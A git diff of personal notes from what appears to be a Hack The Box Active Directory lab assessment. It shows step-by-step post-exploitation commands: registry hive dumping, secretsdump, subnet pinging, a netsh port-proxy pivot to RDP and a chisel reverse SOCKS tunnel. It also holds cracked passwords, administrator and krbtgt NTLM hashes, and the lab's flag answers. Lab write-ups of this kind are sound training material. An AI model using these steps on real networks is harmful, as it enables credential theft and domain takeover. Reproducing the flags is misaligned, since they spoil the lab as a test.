@@ -1,5 +1,6 @@
 Scenario
-A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
+A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server.
+Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
 
 Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.
 
@@ -41,26 +42,59 @@ Question 3 - Crack the account's password. Submit the cleartext value.
 5) output of cracked hash = lucky7 
 
 
-Question 4 -  Submit the contents of the flag.txt file on the Administrator desktop on MS01
+Question 4 -  Submit the contents of the flag.txt file on the Administrator desktop on MS01 - spn$_r0ast1ng_on_@n_0p3n_f1re 
 1) ON REVERSE SHELL -> mkdir c:\tools
 2) cd C:\tools 
 3) reg.exe save hklm\sam C:\tools\sam.save
 reg.exe save hklm\system C:\tools\system.save
 reg.exe save hklm\security C:\tools\security.save
 4) this is where im stuck trying to transfer back to Host machine
+5) okay after multiple attempts to transfer the .save fiels nothing worked. since we have the user name and password im going to try a different route and proxychain from the powershell session then xfreerdp into ol boy... stand by 
+6) reverse shell back 
+7) ipconfig /all -> IPv4 Address. . . . . . . . . . . : 172.16.6.100(Preferred) + Default Gateway . . . . . . . . . : 172.16.6.1 + DNS Servers . . . . . . . . . . . : 172.16.6.3
+8) import-Module PowerView.ps1 again 
+9) Get-DomainController -> IPAddress: 172.16.6.3 
+10) for($i=2;$i -lt 255;$i++){ping -n 1 172.16.6.$i | findstr TTL}
+11) replys from 172.16.6.3 + 172.16.6.50 + 172.16.6.100 -> .3 is DC .100 = us so 50 must be MS01 
+12) netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.202.242 connectport=3389 connectaddress=172.16.6.50
+13) netsh.exe interface portproxy show v4tov4 -> jsut to confirm 
+14) xfreerdp /v:10.129.202.242:8080 /u:svc_sql /p:lucky7 /dynamic-resolution +clipboard /drive:shared,/home/htb-ac-1235531/Desktop
+15) C drive and navigate to administrator desktop -> spn$_r0ast1ng_on_@n_0p3n_f1re 
 
 
-
-Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer.
-
-
-
-Question 6 -  Submit this user's cleartext password.
-
-
-
-Question 7 -  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
+Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer. - tpetty 
+1) ON XFREERDP SESSION 
+2) reg.exe save hklm\sam C:\tools\sam.save
+reg.exe save hklm\system C:\tools\system.save
+reg.exe save hklm\security C:\tools\security.save
+3) now we have a shared drive set up finally.... just copy and paste to KALI machine 
+4) secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+5) output we get hashes and user of: tpetty and pass of Sup3rS3cur3D0m@inU2eR 
 
 
+Question 6 -  Submit this user's cleartext password. - Sup3rS3cur3D0m@inU2eR 
+1) steps above 
 
-Question 8 - 
+
+Question 7 -  What attack can this user perform?
+1) after finding tpettys ACLs and GUIDs we can perform a DCSync attack with that account. 
+
+
+Question 8 - Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 - r3plicat1on_m@st3r! 
+.\chisel.exe client 10.10.14.128:8080 R:socks
+
+
+aadministrator Credentials:
+  Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0
+    ntlm- 0: 27dedb1dab4d8545c6e1c66fba077da0
+    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
+    lm  - 0: 757743529af55e110994f3c7e3710fc9
+
+Domain SID: S-1-5-21-2270287766-1317258649-2146029398
+
+krbtgt: Credentials:
+  Hash NTLM: 6dbd63f4a0e7c8b221d61f265c4a08a7
+    ntlm- 0: 6dbd63f4a0e7c8b221d61f265c4a08a7
+    lm  - 0: 71f5354fb6fbe151714f6721f59011dd
+
+i literally hate HTB labs dude.. i have 3 ways to complete this and of course none are working :] basically we need proxychains or portfwd to actually work, then we just take all the info we found and either past the ticket with impacket OR evilwinrm but none are working so cool. 
